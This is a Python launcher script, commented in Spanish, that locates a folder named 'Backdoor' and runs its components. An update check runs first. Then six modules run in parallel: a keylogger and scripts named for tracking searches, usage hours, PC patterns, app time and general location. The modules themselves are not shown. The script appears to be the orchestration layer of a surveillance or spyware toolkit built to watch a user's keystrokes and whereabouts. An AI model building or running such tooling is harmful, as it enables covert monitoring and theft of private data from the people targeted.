import subprocess
import os
import threading
from concurrent.futures import ThreadPoolExecutor

def encontrar_ruta_repositorio():
    """
    Encuentra la ruta del repositorio buscando hacia arriba en el árbol de directorios.
    """
    ruta_actual = os.path.dirname(os.path.abspath(__file__))
    while ruta_actual != os.path.dirname(ruta_actual):  # Hasta llegar a la raíz
        if os.path.exists(os.path.join(ruta_actual, 'Backdoor')):
            return ruta_actual
        ruta_actual = os.path.dirname(ruta_actual)
    return None

def ejecutar_programa(ruta_programa, *argumentos):
    """
    Ejecuta un programa externo y captura su salida.
    
    :param ruta_programa: Ruta del programa o comando a ejecutar.
    :param argumentos: Argumentos adicionales para el programa.
    :return: Código de salida y salida estándar/error del programa.
    """
    try:
        # Configurar el entorno para usar UTF-8
        env = os.environ.copy()
        env["PYTHONIOENCODING"] = "utf-8"
        
        # Forzar modo ASCII para la salida
        resultado = subprocess.run(
            [ruta_programa, *argumentos],
            text=True,
            capture_output=True,
            check=True,
            encoding='ascii',  # Usar ASCII en lugar de UTF-8
            errors='replace',  # Reemplazar caracteres no-ASCII
            env=env
        )
        print("Salida estándar:")
        print(resultado.stdout)
        return resultado.returncode, resultado.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error ejecutando {ruta_programa}:")
        print(e.stderr)
        return e.returncode, e.stderr
    except FileNotFoundError:
        print(f"El programa {ruta_programa} no se encontró.")
        return -1, "Archivo no encontrado."

def ejecutar_archivos(ruta_repo, archivos):
    """
    Ejecuta múltiples archivos Python simultáneamente usando hilos.
    
    :param ruta_repo: Ruta base del repositorio
    :param archivos: Lista de rutas relativas de archivos a ejecutar
    """
    resultados = []
    
    def ejecutar_archivo(archivo):
        ruta_archivo = os.path.join(ruta_repo, 'Backdoor', archivo)
        if os.path.exists(ruta_archivo):
            print(f"\nEjecutando {ruta_archivo}")
            codigo, salida = ejecutar_programa('python', ruta_archivo)
            return {
                'archivo': archivo,
                'codigo': codigo,
                'salida': salida
            }
        else:
            print(f"\nNo se encontró el archivo {archivo}")
            return None
    
    # Usar ThreadPoolExecutor para ejecutar los archivos en paralelo
    with ThreadPoolExecutor() as executor:
        resultados = list(filter(None, executor.map(ejecutar_archivo, archivos)))
    
    return resultados

# Modificación del bloque principal
if __name__ == "__main__":
    # Definir niveles de prioridad
    prioridades = [
        ['0CheckUpdates.py'],  # Prioridad 1 - Se ejecuta primero y solo
        [                      # Prioridad 2 - Se ejecutan en paralelo
            'BusquedasFrecuentes.py',
            'Horarios_De_Uso.py',
            'keylogger.py',
            'PatronesDePc.py',
            'TiempoEnApps.py',
            'UbicacionGeneral.py'
        ]
    ]
    
    ruta_repo = encontrar_ruta_repositorio()
    if ruta_repo:
        # Ejecutar archivos por nivel de prioridad
        for i, nivel_prioridad in enumerate(prioridades):
            print(f"\nEjecutando nivel de prioridad {i+1}...")
            resultados = ejecutar_archivos(ruta_repo, nivel_prioridad)
            
            # Verificar resultados
            hay_error = False
            for resultado in resultados:
                print(f"\nResultados para {resultado['archivo']}:")
                print(f"Código de salida: {resultado['codigo']}")
                
                # Si es el primer nivel (CheckUpdates) y hay error, no continuar
                if i == 0 and resultado['codigo'] != 0:
                    print("Error en CheckUpdates. Deteniendo la ejecución...")
                    hay_error = True
                    break
            
            # Si hubo error en el primer nivel, no continuar con los siguientes
            if hay_error:
                break
    else:
        print("No se pudo encontrar la carpeta del repositorio")
